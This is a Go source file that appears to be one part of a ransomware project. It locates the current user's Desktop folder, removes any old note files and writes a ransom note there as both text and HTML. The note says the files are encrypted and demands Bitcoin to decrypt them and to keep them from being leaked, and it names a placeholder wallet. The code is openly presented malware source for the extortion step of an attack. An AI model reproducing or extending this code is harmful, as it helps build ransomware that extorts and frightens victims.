package main

import (
	"helpers"
	"os"
	"os/user"
)

var textForTxt = "YOUR FILES HAVE BEEN ENCRYPTED\n\nTo encrypt your files you have pay ransom.\nThe ransom must be paid in Bitcoin!\nThe amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.\nThe amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.\nYou can send them to 1aChInoBitWallet123321"
var textForHtml = "<html lang='en'>" +
	"<head>" +
	"<meta charset='UTF-8'>" +
	"<meta name='viewport' content='width=device-width, initial-scale=1.0'>" +
	"<title>Document</title>" +
	"</head>" +
	"<body>" +
	"<h1>YOUR FILES HAVE BEEN ENCRYPTED</h1>" +
	"<h2>To encrypt your files you have pay ransom.</h2>" +
	"<p>The ransom must be paid in Bitcoin!<br>" +
	"The amount of ransom that has to be baid in order to decrypt your files is 0.005 Bitcoin.<br>" +
	"The amount of ransom that has to be baid in order to not spread your files is 0.01 Bitcoin.<br>" +
	"You can send them to 1aChInoBitWallet123321<br>" +
	"</p>" +
	"</body>" +
	"</html>"

func getDesktopFolder(dir, nameOfLogFile string) string {
	currentDir, err := os.ReadDir(dir)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(6)
	}

	for _, entry := range currentDir {
		if entry.IsDir() {
			if entry.Name() == "Desktop" {
				return dir + "/" + entry.Name()
			}
		}
	}

	for _, entry := range currentDir {
		if entry.IsDir() {
			currentSubDirName := dir + "/" + entry.Name()
			currentSubDir, err := os.ReadDir(currentSubDirName)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
				os.Exit(7)
			}

			for _, entry := range currentSubDir {
				if entry.IsDir() {
					if entry.Name() == "Desktop" {
						return currentSubDirName + "/" + entry.Name()
					}
				}
			}
		}
	}

	return ""
}

func main() {
	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "RanNote")

	user, err := user.Current()
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(1)
	}

	desktopDir := getDesktopFolder(user.HomeDir, nameOfLogFile)

	_, err = os.Open(desktopDir + "/RansomwareNote.txt")
	if err == nil {
		os.Remove(desktopDir + "/RansomwareNote.txt")
	}

	_, err = os.Open(desktopDir + "/RansomwareNote.html")
	if err == nil {
		os.Remove(desktopDir + "/RansomwareNote.html")
	}

	noteTxt, err := os.Create(desktopDir + "/RansomwareNote.txt")
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(2)
	}

	_, err = noteTxt.WriteString(textForTxt)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(3)
	}

	noteHtml, err := os.Create(desktopDir + "/RansomwareNote.html")
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(4)
	}

	_, err = noteHtml.WriteString(textForHtml)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		os.Exit(5)
	}

	os.Exit(0)
}
